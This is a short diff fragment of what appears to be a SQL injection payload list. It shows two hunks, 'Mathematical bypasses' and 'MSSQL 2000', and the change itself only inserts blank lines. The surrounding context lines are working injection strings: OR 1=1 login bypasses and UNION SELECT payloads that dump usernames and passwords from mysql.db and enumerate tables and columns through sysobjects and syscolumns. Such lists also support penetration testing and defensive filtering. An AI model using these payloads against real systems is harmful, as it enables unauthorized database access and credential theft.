@@ -38,6 +38,7 @@
 -->
 
 -- Mathematical bypasses
+
 ' OR 1=1--
 ' OR 1=1 LIMIT 1--
 ' OR 1=1 OFFSET 0--
@@ -1484,6 +1485,7 @@ SELECT routine_name, routine_type FROM information_schema.routines
 ' UNION SELECT db,user,password FROM mysql.db--
 
 -- MSSQL 2000
+
 ' UNION SELECT name FROM sysobjects WHERE xtype='U'--
 ' UNION SELECT name FROM syscolumns WHERE id=OBJECT_ID('users')--
 
